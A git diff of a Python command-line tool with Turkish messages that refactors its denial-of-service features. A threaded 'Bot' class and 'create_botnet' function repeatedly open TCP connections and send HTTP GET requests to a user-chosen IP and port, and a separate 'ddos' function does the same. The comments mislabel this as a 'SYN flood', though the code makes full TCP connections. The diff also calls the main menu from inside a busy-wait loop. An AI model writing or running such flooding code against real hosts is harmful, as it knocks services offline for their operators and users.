@@ -6,6 +6,54 @@ import sys
 import pyfiglet
 from colorama import Fore
 from urllib.parse import urlparse
+import random
+import queue
+
+class Bot:
+    def __init__(self, target_ip, target_port, attack_queue):
+        self.target_ip = target_ip
+        self.target_port = target_port
+        self.attack_queue = attack_queue
+
+    def syn_flood_attack(self):
+        while True:
+            try:
+                # SYN paketi oluştur
+                src_port = random.randint(1024, 65535)
+                syn_packet = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nPort: {src_port}\r\n\r\n"
+                # Hedefe SYN paketi gönder
+                bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                bot_socket.connect((self.target_ip, self.target_port))
+                bot_socket.sendall(syn_packet.encode())
+                bot_socket.close()
+                # Saldırıyı görüntüleme kuyruğuna ekle
+                self.attack_queue.put(1)
+            except Exception as e:
+                print(Fore.RED + f"  Hata Oluştu: {e}\n")
+                break
+
+def visualize_attack_status(attack_queue, max_attack):
+    attack_counter = 0
+    while attack_counter < max_attack:
+        try:
+            # Saldırıyı bekleyin
+            attack_queue.get(timeout=2)
+            attack_counter += 1
+            print(Fore.CYAN + f"  Saldırı Devam Ediyor: {attack_counter}/{max_attack} paket gönderildi\n")
+        except queue.Empty:
+            break
+
+def create_botnet(target_ip, target_port, bot_count, max_attack):
+    attack_queue = queue.Queue()
+    bots = []
+    for i in range(bot_count):
+        bot = Bot(target_ip, target_port, attack_queue)
+        bot_thread = threading.Thread(target=bot.syn_flood_attack)
+        bot_thread.daemon = True
+        bot_thread.start()
+        bots.append(bot)
+    
+    threading.Thread(target=visualize_attack_status, args=(attack_queue, max_attack)).start()
 
 def slow_print(text):
     for char in text:
@@ -38,14 +86,18 @@ def get_local_ip_addresses():
         addresses = netifaces.ifaddresses(interface).get(netifaces.AF_INET)
         if addresses:
             for address_info in addresses:
-                ip_addresses.append(address_info['addr'])
+                if 'addr' in address_info:  # IP adresi varsa
+                    ip_addresses.append(address_info['addr'])
     return ip_addresses
 
 def print_local_ip_addresses():
-    print(Fore.GREEN + "  Yerel IP Adresiniz:")
+    print(Fore.GREEN + "  Yerel IP Adresleriniz:")
     ip_addresses = get_local_ip_addresses()
-    for ip in ip_addresses:
-        print(Fore.YELLOW + f"  {ip}\n")
+    if ip_addresses:
+        for ip in ip_addresses:
+            print(Fore.YELLOW + f"  {ip}\n")
+    else:
+        print(Fore.RED + "  Yerel IP adresi bulunamadı.")
 
 def get_ip_from_url(url):
     try:
@@ -94,47 +146,8 @@ def get_valid_port():
         else:
             print(Fore.RED + "  Geçersiz Port Numarası! Lütfen doğru Port Numarası Girin.")
 
-def visualize_attack_status():
-    global attack_ongoing
-    global attack_counter
-    global max_attack
-    while attack_ongoing and (max_attack is None or attack_counter < max_attack):
-        time.sleep(2)
-        print(Fore.CYAN + f"  Saldırı Devam Ediyor: {attack_counter}/{max_attack} paket gönderildi")
-        attack_delay = 0.5
-
-     
-
-def create_botnet(target_ip, target_port, bot_count):
-    def syn_flood_attack(bot_number, target_ip, target_port):
-        global attack_ongoing
-        global attack_counter
-        while attack_ongoing and (max_attack is None or attack_counter < max_attack):
-            try:
-                bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                bot_socket.connect((target_ip, target_port))
-                bot_socket.send(b"GET / HTTP/1.1\r\n")
-                bot_socket.send(b"Host: " + target_ip.encode() + b"\r\n\r\n")
-                bot_socket.close()
-                print(Fore.GREEN + f"  Saldırı Başlatıldı: Bot-{bot_number}, Hedef: {target_ip}:{target_port}")
-                time.sleep(0.5)
-                attack_counter += 1
-            except Exception as e:
-                print(Fore.RED + f"  Hata Oluştu: {e}")
-                attack_ongoing = False
-                time.sleep(3)
-                
-
-    for i in range(bot_count):
-        bot_thread = threading.Thread(target=syn_flood_attack, args=(i+1, target_ip, target_port))
-        bot_thread.daemon = True
-        bot_thread.start()
-
-    threading.Thread(target=visualize_attack_status).start()
-
-
 def ddos(target_ip, target_port, packet_count):
-   for _ in range(packet_count):
+    for _ in range(packet_count):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target_ip, target_port))
@@ -169,10 +182,12 @@ def attack_menu():
     print(Fore.CYAN + f"  Saldırı Kaç Paket Gönderildiğinde Durdurulsun: {max_attack}")
 
     attack_ongoing = True
-    create_botnet(target_ip, target_port, bot_count)
+    create_botnet(target_ip, target_port, bot_count, max_attack)
 
     while attack_ongoing and (max_attack is None or attack_counter < max_attack):
         pass
+        
+        main_menu()
 
 def main_menu():
     global attack_ongoing
